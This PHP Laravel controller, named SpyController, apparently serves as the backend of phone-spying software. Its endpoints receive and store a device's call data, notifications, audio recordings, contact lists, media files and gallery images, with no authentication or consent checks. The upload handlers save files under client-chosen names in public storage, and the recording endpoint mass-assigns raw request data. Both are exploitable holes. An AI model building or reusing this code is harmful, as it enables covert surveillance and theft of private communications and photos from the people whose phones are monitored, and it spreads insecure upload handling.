<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Device;
use App\Models\DeviceLog;
use Illuminate\Support\Facades\Storage;
use App\Models\media_file;
use App\Models\Recording;
use App\Models\Contact;
use App\Models\Gallery;

class SpyController extends Controller
{
    //
    public function device_logs()
    {
        
    }
    
    public function logsStore(request $request)
    {
		//return $request->all();
        if(empty($request->all()))
        {
            return response()->json(["success" => false,"message" => "empty post data"], 200);
        }
        $old = Device::where("device_id", $request->deviceId);
        $old_record =  $old->first();
        if(!empty($old_record))
        {
            DeviceLog::where("device_id",$old_record->id)->where("Status",1)->update([
                "record" => $request->callData,
                "Status" => 1
            ]);
       
           return response()->json(["status" => true ,"message" => "recored updated"], 200);
        
        }
        $resp = Device::create([
            "device_id" => $request->deviceId,
            "deviceName" => $request->deviceName,
        ]);
        DeviceLog::create([
            "device_id" => $resp->id,
            "record" => $request->callData,
            "Status" => 1
        ]); 
        return response()->json(["status" => true ,"message" => "data saved"], 200);
    }

    public function notificationStore(request $request)
    {
       
        if(empty($request->all()))
        {
            return response()->json(["success" => false,"message" => "empty post data"], 200);
        }
        $old = Device::where("device_id", $request->deviceId);
        $old_record =  $old->first();
        if(!empty($old_record))
        {
            $resp = DeviceLog::where("device_id",$old_record->id)->where("Status",3)->get();
            if(count($resp) != 0){
                DeviceLog::create([
                    "device_id" => $old_record->id,
                    "record" => $request->notification,
                    "Status" => 3
                ]);
            }
            else
            {
                DeviceLog::create([
                    "device_id" => $old_record->id,
                    "record" => $request->notification,
                    "Status" => 3
                ]);
            }
            return response()->json(["status" => true ,"message" => "recored updated"], 200);
        }
        $resp = Device::create([
            "device_id" => $request->deviceId,
            "deviceName" => $request->deviceName,
        ]);
        DeviceLog::create([
            "device_id" => $resp->id,
            "record" => $request->notification,
            "Status" => 3
        ]);
        return response()->json(["status" => true ,"message" => "data saved"], 200);
    }


    public function Mediastore(Request $request)
    {   
        $device = Device::where("device_id",$request->device_id)->first();

        $file = $request->file('file');
	//print_r($file);die;
        // Generate a unique filename
        $filename = uniqid() . '.' . $file->getClientOriginalName();
    
       // // Save the file to the storage disk
        $path = Storage::disk('public')->putFileAs('uploads', $file, $filename);
    
        // // Get the URL for the saved file
        $url = Storage::disk('public')->url($path);
        
        media_file::create([
            'device_id' => $device->device_id,
            'type' => $request->type,
            'url' => $url 
        ]);
        // // // Return the URL to the client
        return response()->json([
            "success" => true,
            'device_id' => $device->device_id,
            'type' => $request->type,
            'url' => $url,
        ]);
    }
    
    public function Audiostore(Request $request)
    {   
		Recording::create($request->all());
	    return response()->json(["status" => true ,"message" => "data saved"], 200);
 
    }
    public function Contactstore(Request $request)
    {   
		$recentcontact =  Contact::where("device_id",$request->device_id);
		if(empty($recentcontact->first()))
		{
		  Contact::create([
		  	"device_id" => $request->device_id,
			"contacts" => json_encode($request->contacts),
		  ]);
   	      return response()->json(["status" => true ,"message" => "data saved"], 200);
		}
		else
		{
		  $recentcontact->update([
		  	"contacts" => json_encode($request->contacts),
		  ]);
		  return response()->json(["status" => true ,"message" => "data updated"], 200);
	    }
    }
	public function Gallerystore(Request $request)
	{
	
		
		
		$device = Device::where("device_id",$request->device_id)->first();

        $file = $request->file('galleryImages');
	//print_r($file);die;
        // Generate a unique filename
		$images = $request->file('galleryImages');
			
			// Loop through each file and store it
		foreach ($images as $image) {
			$filename = uniqid() . '.' . $image->getClientOriginalName();

		   // // Save the file to the storage disk
			$path = Storage::disk('public')->putFileAs('gallery', $image, $filename);

			// // Get the URL for the saved file
			$url = Storage::disk('public')->url($path);


			Gallery::create([
				"device_id" => $request->device_id,
				//"url" => Storage::disk('public')->url($path)
				"url" => $filename,
			]);
			// // // Return the URL to the client
			
		}
		return response()->json([
				"success" => true,
				'message' => 'Images uploaded successfully',
			]);
	}
	
}
